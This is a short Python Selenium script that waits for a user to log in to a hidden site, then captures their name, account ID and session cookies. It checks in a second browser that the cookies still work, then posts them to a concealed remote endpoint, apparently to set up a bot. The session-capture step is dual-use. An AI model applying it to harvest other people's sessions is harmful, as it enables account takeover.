import json
from time import sleep
import SECRET
import threading
import requests
from Utils import *


def BackgroundTask():
    global cookies, success, driver, finished
    newDriver = CreateDriver()
    newDriver.get(SECRET.E)
    newDriver.delete_all_cookies()
    while(not finished):
        try:
            driver.current_url
            sleep(0.2)
        except:
            driver.quit()
            newDriver.quit()
            exit()

    for cookie in cookies:
        newDriver.add_cookie(cookie)
    
    newDriver.get(SECRET.E)
    success = newDriver.current_url == SECRET.E
    newDriver.quit()


success = cookies = finished = None
threading.Thread(target=BackgroundTask).start() # verifica em background a veracidade dos dados obtidos
driver = CreateDriver(visible=True)
driver.get(SECRET.E)
WaitLogin(driver)
name = GetUserName(driver)
accID = GetAccID(driver)
cookies = driver.get_cookies()
driver.delete_all_cookies()
finished = True
sleep(2)
driver.quit()
print("\nAguarde...\n")
while(success == None):
    sleep(0.2)
if(success and name not in ['', None] and accID):
    r = requests.post(SECRET.A, json={SECRET.B:str(name), SECRET.C:json.dumps(cookies), SECRET.D:accID})
    print(r.text)
else:
    print("Não consegui criar o bot")
input("\n\nPressione Enter para sair")
